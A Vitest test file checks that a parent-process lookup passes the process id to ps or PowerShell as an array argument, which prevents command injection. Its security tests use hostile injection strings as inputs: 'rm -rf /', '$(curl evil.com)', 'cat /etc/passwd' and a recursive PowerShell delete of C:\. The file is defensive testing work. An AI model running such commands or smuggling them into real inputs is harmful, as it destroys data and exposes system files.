/**
 * Tests for getParentProcessName() — command injection prevention (issue #102).
 *
 * Verifies that:
 * 1. execFileSync is used with argument arrays (not shell interpolation)
 * 2. ppid is safely converted via String() — never template-interpolated into a command string
 * 3. Timeout is enforced (500ms)
 * 4. Malicious ppid values are harmless (passed as single array element)
 * 5. Platform branching is correct
 * 6. All error/edge cases return undefined gracefully
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { execFileSync } from 'child_process';

// Mock child_process at module level
vi.mock('child_process', () => ({
  execFileSync: vi.fn(),
}));

const mockExecFileSync = vi.mocked(execFileSync);

// Import after mock setup
import { getParentProcessName } from '../../../src/utils/parentProcess.js';

describe('getParentProcessName', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // ────────────────────────────────────────────
  // Security tests (command injection prevention)
  // ────────────────────────────────────────────

  describe('security: command injection prevention', () => {
    it('calls execFileSync with argument ARRAY, not interpolated string (darwin)', () => {
      mockExecFileSync.mockReturnValue('node\n');

      getParentProcessName(1234, 'darwin');

      expect(mockExecFileSync).toHaveBeenCalledWith(
        'ps',
        ['-p', '1234', '-o', 'comm='],
        expect.objectContaining({ encoding: 'utf8' }),
      );

      // Verify the second argument is an array, not a string
      const callArgs = mockExecFileSync.mock.calls[0];
      expect(Array.isArray(callArgs[1])).toBe(true);
    });

    it('calls execFileSync with argument ARRAY, not interpolated string (linux)', () => {
      mockExecFileSync.mockReturnValue('bash\n');

      getParentProcessName(5678, 'linux');

      expect(mockExecFileSync).toHaveBeenCalledWith(
        'ps',
        ['-p', '5678', '-o', 'comm='],
        expect.objectContaining({ encoding: 'utf8' }),
      );
      expect(Array.isArray(mockExecFileSync.mock.calls[0][1])).toBe(true);
    });

    it('converts ppid to string via String(), not template interpolation (darwin)', () => {
      mockExecFileSync.mockReturnValue('zsh\n');

      getParentProcessName(42, 'darwin');

      // The ppid argument must be the string "42", passed as a discrete array element
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('42');
      expect(typeof args[1]).toBe('string');
    });

    it('passes malicious ppid "1; rm -rf /" as a single harmless argument', () => {
      // Simulate a crafted ppid value (in reality ppid is always a number,
      // but this proves execFileSync treats it as one argument, not shell code)
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id: 1; rm -rf /');
      });

      const result = getParentProcessName('1; rm -rf /' as unknown as number, 'darwin');

      // Should not crash, should return undefined
      expect(result).toBeUndefined();

      // The malicious string is passed as a single array element, not shell-interpreted
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('1; rm -rf /');
      // Verify it was NOT passed as part of a concatenated command string
      expect(mockExecFileSync.mock.calls[0][0]).toBe('ps');
    });

    it('passes malicious ppid with backticks as a single argument', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id');
      });

      const result = getParentProcessName('`whoami`' as unknown as number, 'darwin');

      expect(result).toBeUndefined();
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('`whoami`');
    });

    it('passes malicious ppid with $() substitution as a single argument', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id');
      });

      const result = getParentProcessName('$(curl evil.com)' as unknown as number, 'darwin');

      expect(result).toBeUndefined();
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('$(curl evil.com)');
    });

    it('passes malicious ppid with pipe as a single argument', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id');
      });

      const result = getParentProcessName('1 | cat /etc/passwd' as unknown as number, 'darwin');

      expect(result).toBeUndefined();
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('1 | cat /etc/passwd');
    });

    it('passes malicious ppid with newline injection as a single argument', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id');
      });

      const result = getParentProcessName('1\nrm -rf /' as unknown as number, 'darwin');

      expect(result).toBeUndefined();
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('1\nrm -rf /');
    });

    it('enforces timeout of 500ms on execFileSync (darwin)', () => {
      mockExecFileSync.mockReturnValue('launchd\n');

      getParentProcessName(1, 'darwin');

      expect(mockExecFileSync).toHaveBeenCalledWith(
        'ps',
        expect.any(Array),
        expect.objectContaining({ timeout: 500 }),
      );
    });

    it('enforces timeout of 500ms on execFileSync (win32)', () => {
      mockExecFileSync.mockReturnValue('explorer\n');

      getParentProcessName(9999, 'win32');

      expect(mockExecFileSync).toHaveBeenCalledWith(
        'powershell',
        expect.any(Array),
        expect.objectContaining({ timeout: 500 }),
      );
    });

    it('win32 uses execFileSync with powershell and argument array', () => {
      mockExecFileSync.mockReturnValue('code\n');

      getParentProcessName(4567, 'win32');

      // PID is bound to $args[0] and passed positionally after `--`, not
      // interpolated into the -Command string (#280).
      expect(mockExecFileSync).toHaveBeenCalledWith(
        'powershell',
        ['-NoProfile', '-Command', '(Get-Process -Id $args[0]).ProcessName', '--', '4567'],
        expect.objectContaining({ encoding: 'utf8', timeout: 500 }),
      );
      expect(Array.isArray(mockExecFileSync.mock.calls[0][1])).toBe(true);
    });

    it('win32: malicious ppid is a positional PowerShell argument, never in the command string', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('Get-Process error');
      });

      getParentProcessName('1; Remove-Item -Recurse C:\\' as unknown as number, 'win32');

      const args = mockExecFileSync.mock.calls[0][1] as string[];
      // The PID is passed positionally (bound to $args[0]) — execFileSync sends
      // it to powershell.exe as a separate argument, never through a shell.
      expect(args).toEqual([
        '-NoProfile',
        '-Command',
        '(Get-Process -Id $args[0]).ProcessName',
        '--',
        '1; Remove-Item -Recurse C:\\',
      ]);
      // The -Command string holds only the $args[0] placeholder — the malicious
      // value is NOT interpolated into it.
      expect(args[2]).not.toContain('Remove-Item');
    });
  });

  // ────────────────────────────────────────────
  // Functional tests
  // ────────────────────────────────────────────

  describe('functional: normal operation', () => {
    it('returns trimmed process name on darwin', () => {
      mockExecFileSync.mockReturnValue('node\n');
      expect(getParentProcessName(100, 'darwin')).toBe('node');
    });

    it('returns trimmed process name on linux', () => {
      mockExecFileSync.mockReturnValue('  bash  \n');
      expect(getParentProcessName(200, 'linux')).toBe('bash');
    });

    it('returns trimmed process name on win32', () => {
      mockExecFileSync.mockReturnValue('  explorer  \r\n');
      expect(getParentProcessName(300, 'win32')).toBe('explorer');
    });

    it('returns undefined when ppid does not exist (execFileSync throws)', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: process not found');
      });

      expect(getParentProcessName(999999, 'darwin')).toBeUndefined();
    });

    it('returns undefined when ps returns empty string', () => {
      mockExecFileSync.mockReturnValue('');
      expect(getParentProcessName(100, 'darwin')).toBeUndefined();
    });

    it('returns undefined when ps returns only whitespace', () => {
      mockExecFileSync.mockReturnValue('   \n  ');
      expect(getParentProcessName(100, 'darwin')).toBeUndefined();
    });
  });

  // ────────────────────────────────────────────
  // Platform branching
  // ────────────────────────────────────────────

  describe('platform branching', () => {
    it('uses ps on darwin', () => {
      mockExecFileSync.mockReturnValue('launchd\n');

      getParentProcessName(1, 'darwin');

      expect(mockExecFileSync).toHaveBeenCalledWith('ps', expect.any(Array), expect.any(Object));
    });

    it('uses ps on linux', () => {
      mockExecFileSync.mockReturnValue('systemd\n');

      getParentProcessName(1, 'linux');

      expect(mockExecFileSync).toHaveBeenCalledWith('ps', expect.any(Array), expect.any(Object));
    });

    it('uses powershell on win32', () => {
      mockExecFileSync.mockReturnValue('System\n');

      getParentProcessName(1, 'win32');

      expect(mockExecFileSync).toHaveBeenCalledWith('powershell', expect.any(Array), expect.any(Object));
    });

    it('returns undefined on unsupported platform (freebsd)', () => {
      expect(getParentProcessName(1, 'freebsd')).toBeUndefined();
      expect(mockExecFileSync).not.toHaveBeenCalled();
    });

    it('returns undefined on unsupported platform (aix)', () => {
      expect(getParentProcessName(1, 'aix')).toBeUndefined();
      expect(mockExecFileSync).not.toHaveBeenCalled();
    });

    it('returns undefined on unsupported platform (sunos)', () => {
      expect(getParentProcessName(1, 'sunos')).toBeUndefined();
      expect(mockExecFileSync).not.toHaveBeenCalled();
    });
  });

  // ────────────────────────────────────────────
  // Edge cases
  // ────────────────────────────────────────────

  describe('edge cases', () => {
    it('returns undefined when pid is 0 (falsy)', () => {
      expect(getParentProcessName(0, 'darwin')).toBeUndefined();
      expect(mockExecFileSync).not.toHaveBeenCalled();
    });

    it('returns undefined when pid is undefined (uses process.ppid default)', () => {
      // When pid is undefined, it falls back to process.ppid which is a real number
      // This test just verifies the function doesn't crash with undefined
      mockExecFileSync.mockReturnValue('some-process\n');
      const result = getParentProcessName(undefined, 'darwin');
      // process.ppid is truthy (real PID), so it should call execFileSync
      expect(mockExecFileSync).toHaveBeenCalled();
      expect(result).toBe('some-process');
    });

    it('handles timeout error gracefully', () => {
      const timeoutError = new Error('ETIMEDOUT');
      (timeoutError as NodeJS.ErrnoException).code = 'ETIMEDOUT';
      mockExecFileSync.mockImplementation(() => { throw timeoutError; });

      expect(getParentProcessName(100, 'darwin')).toBeUndefined();
    });

    it('handles very large ppid number', () => {
      mockExecFileSync.mockReturnValue('bigprocess\n');

      const result = getParentProcessName(2147483647, 'darwin'); // INT32_MAX

      expect(result).toBe('bigprocess');
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('2147483647');
    });

    it('trims result with mixed whitespace and newlines', () => {
      mockExecFileSync.mockReturnValue('\t  node  \n\r\n');
      expect(getParentProcessName(100, 'darwin')).toBe('node');
    });

    it('handles process name with full path from ps', () => {
      mockExecFileSync.mockReturnValue('/usr/local/bin/node\n');
      expect(getParentProcessName(100, 'darwin')).toBe('/usr/local/bin/node');
    });

    it('handles Unicode process name', () => {
      mockExecFileSync.mockReturnValue('日本語アプリ\n');
      expect(getParentProcessName(100, 'darwin')).toBe('日本語アプリ');
    });

    it('handles ENOENT error when ps command not found', () => {
      const enoentError = new Error('ENOENT');
      (enoentError as NodeJS.ErrnoException).code = 'ENOENT';
      mockExecFileSync.mockImplementation(() => { throw enoentError; });

      expect(getParentProcessName(100, 'linux')).toBeUndefined();
    });

    it('handles EPERM error (permission denied)', () => {
      const epermError = new Error('EPERM');
      (epermError as NodeJS.ErrnoException).code = 'EPERM';
      mockExecFileSync.mockImplementation(() => { throw epermError; });

      expect(getParentProcessName(100, 'darwin')).toBeUndefined();
    });

    it('handles negative ppid gracefully', () => {
      mockExecFileSync.mockImplementation(() => {
        throw new Error('ps: illegal process id: -1');
      });

      expect(getParentProcessName(-1, 'darwin')).toBeUndefined();
      // -1 is truthy, so execFileSync IS called
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe('-1');
    });

    it('handles NaN ppid as falsy', () => {
      // NaN is falsy: !NaN === true
      expect(getParentProcessName(NaN, 'darwin')).toBeUndefined();
      expect(mockExecFileSync).not.toHaveBeenCalled();
    });

    it('handles process.ppid fallback when no pid provided', () => {
      // Without explicit pid, uses process.ppid
      mockExecFileSync.mockReturnValue('parent\n');
      const result = getParentProcessName();
      // Should use the real process.ppid
      expect(result).toBe('parent');
      const args = mockExecFileSync.mock.calls[0][1] as string[];
      expect(args[1]).toBe(String(process.ppid));
    });

    it('pid 1 (init/launchd) works correctly', () => {
      mockExecFileSync.mockReturnValue('launchd\n');
      expect(getParentProcessName(1, 'darwin')).toBe('launchd');
    });

    it('does not call execFileSync more than once per invocation', () => {
      mockExecFileSync.mockReturnValue('node\n');
      getParentProcessName(100, 'darwin');
      expect(mockExecFileSync).toHaveBeenCalledTimes(1);
    });
  });
});
